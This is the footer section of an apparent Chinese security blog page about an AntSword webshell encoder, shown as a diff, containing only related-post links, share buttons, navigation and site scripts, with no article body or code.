+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-2/">蚁剑改造计划之实现其他参数的随机化</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-1/">蚁剑改造计划之增加垃圾数据</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-12-09</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/antsword-xor-encoder-2/" data-title="基于随机Cookie的蚁剑动态秘钥编码器" data-hashtags="中国蚁剑"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/antsword-xor-encoder-2/" data-hashtag="中国蚁剑"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/antsword-xor-encoder-2/" data-title="基于随机Cookie的蚁剑动态秘钥编码器"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/antsword-xor-encoder-2/" data-title="基于随机Cookie的蚁剑动态秘钥编码器"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/antsword-xor-encoder-2/" data-title="基于随机Cookie的蚁剑动态秘钥编码器"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/antsword-xor-encoder-2/" data-title="基于随机Cookie的蚁剑动态秘钥编码器" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;基于随机Cookie的蚁剑动态秘钥编码器&#34;, &#34;https://yzddmr6.com/posts/antsword-xor-encoder-2/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/">中国蚁剑</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/bypass-waf-sqlin/" class="prev" rel="prev" title="SQL注入“万能”Bypass"><i class="fas fa-angle-left fa-fw"></i>SQL注入“万能”Bypass</a>
+            <a href="/posts/shellcode-bypass-360-1/" class="next" rel="next" title="MSF免杀360&#43;火绒上线(一)">MSF免杀360&#43;火绒上线(一)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
